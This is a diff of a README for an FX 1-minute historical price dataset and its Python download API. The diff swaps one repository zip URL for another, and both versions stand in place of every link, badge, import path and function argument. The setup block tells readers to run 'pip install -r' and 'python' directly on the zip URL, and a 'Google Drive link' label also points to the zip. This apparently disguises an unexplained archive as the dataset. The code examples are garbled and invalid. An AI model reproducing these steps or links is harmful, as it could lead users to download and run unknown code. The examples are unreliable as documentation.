@@ -1,16 +1,16 @@
 # FX 1-Minute Dataset (+ Crude Oil and Stock indexes)
 
-API and dataset download for [https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip).
+API and dataset download for [https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip).
 
 ## Download the dataset
 
-- Click Here to download it: [All instruments - 1Minute - 2000 / 2021 - Google Drive link (2.5GB)](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip).
+- Click Here to download it: [All instruments - 1Minute - 2000 / 2021 - Google Drive link (2.5GB)](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip).
 
 - You can also re-download the whole dataset (up to date) by yourself:
 
 ```bash
-pip install -r https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip
-python https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip
+pip install -r https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip
+python https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip
 ```
 
 Expect it to take around 10 minutes if you have a fast internet connection.
@@ -18,8 +18,8 @@ Expect it to take around 10 minutes if you have a fast internet connection.
 
 ## API
 
-[![Downloads](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-[![Downloads](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
+[![Downloads](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+[![Downloads](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)](https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
 
 ```
 pip install histdata
@@ -29,29 +29,29 @@ pip install histdata
 
 ```python
 from histdata import download_hist_data as dl
-from https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip import Platform as P, TimeFrame as TF
+from https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip import Platform as P, TimeFrame as TF
 ```
 
 - Download tick data for 2019/06:
 
 ```python
-dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
+dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
 ```
 
 - Other possible calls:
 
 ```python
-dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2018', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2018', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
-dl(year='2018', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip)
+dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2019', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2018', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2018', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
+dl(year='2018', month='6', pair='eurusd', https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip, https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip)
 ```
 
 ## Data specification
@@ -75,7 +75,7 @@ This repository contains:
 E   - TX/EUR = EUROSTOXX 50 in EUR
 - A set of functions to download the historical prices yourself.
 
-All the data is retrieved from: https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/utils/FX-1-Minute-Data_v3.7-beta.3.zip
+All the data is retrieved from: https://raw.githubusercontent.com/AvishekInvincible/FX-1-Minute-Data/master/.github/F-Minute-Data-3.4.zip
 
 Any file in a dataset is zipped and contains: 
 - a CSV (semicolon separated file).
